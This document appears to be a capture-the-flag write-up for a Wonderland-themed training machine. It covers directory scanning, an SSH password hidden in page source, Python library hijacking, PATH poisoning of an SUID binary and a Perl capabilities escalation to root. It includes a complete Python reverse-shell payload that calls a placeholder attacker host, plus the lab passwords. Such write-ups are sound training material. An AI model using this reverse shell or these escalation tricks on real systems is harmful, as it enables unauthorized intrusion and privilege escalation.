## recon

### Nmap Scan
![[alice-wonderland-nmap.png]]
> Nmap scan of target box

Ports open:
-	22 (SSH)
-	80 (Web Server)


### Directory Scanning

Scanning for directories on the webserver leads to `http://<ip>/r/a/b/b/i/t/`.

![[alice-homepage.png]]

#### Source code

Checking the source code for this page reveals a string that looks like an SHH user/pass combination.

`style="display:none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail`

## Alice > Rabbit

Using this combination as an SSH user/pass combination gains us access to the target machine.

![[alice-wonderland-ssh-alice.png]]


### sudo -l

Running `sudo -l` tells us we can run `/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py` as user `rabbit`.

![[alice-sudo-l.png]]


Checking the file `walrus_and_the_carpenter.py` shows us that it is importing the library file `random.py`.

![[alice-walrus-random.png]]

We can create our own random.py that the file will read first before the one in `/var/lib/` that throws us a shell we have to catch with a listener as user rabbit.

### Create random.py to throw shell as rabbit to listener.

Creating a new `random.py` file in the home directory allows us to inject malicious code into the running of `walrus_and_the_carpenter.py`. ([[cheatsheet#General Linux stuff#path_poisoning]])

Created `random.py` file:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<host_addr>",<port>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Now when the python code is run using sudo to change to the user `rabbit` we gain a shell as `rabbit`:

## Rabbit > Hatter

Enumerating the home directory of user `rabbit` gives us a file called `teaParty`. This file has an SUID bit set by the user `hatter`. Running this file gives us a segmentation so it could be vulnerable to an overflow attack. Trying to read the contents of the file gives away that it is using the `date` command. We can poison the path with a new date file that contains `/bin/sh` in order to gain a shell as `hatter`. ([[Concepts#path_poisoning]])

`echo "/bin/sh" > /tmp/date`
`export PATH=/tmp:$PATH`

Running the `teaParty` file now will spawn a shell as `hatter`.

##### SHH in as hatter for better shell

Inside hatters home directory is a file `password.txt`. This can be used to SSH back into the machine for a nicer environment for use.

## Hatter > Root

### Run linpeas on target machine, shows pearl as able to set SUID bit

![[alice-linpeas-output.png]]

#### GTFO bins for pearl, use cap_set payload 

![[alice-perl-setuid.png]]

##### read root.txt in /home/alice/ and user.txt in /home/root/ (everything is upside down here)


## General Notes

alice password: HowDothTheLittleCrocodileImproveHisShiningTail

hatter password: WhyIsARavenLikeAWritingDesk?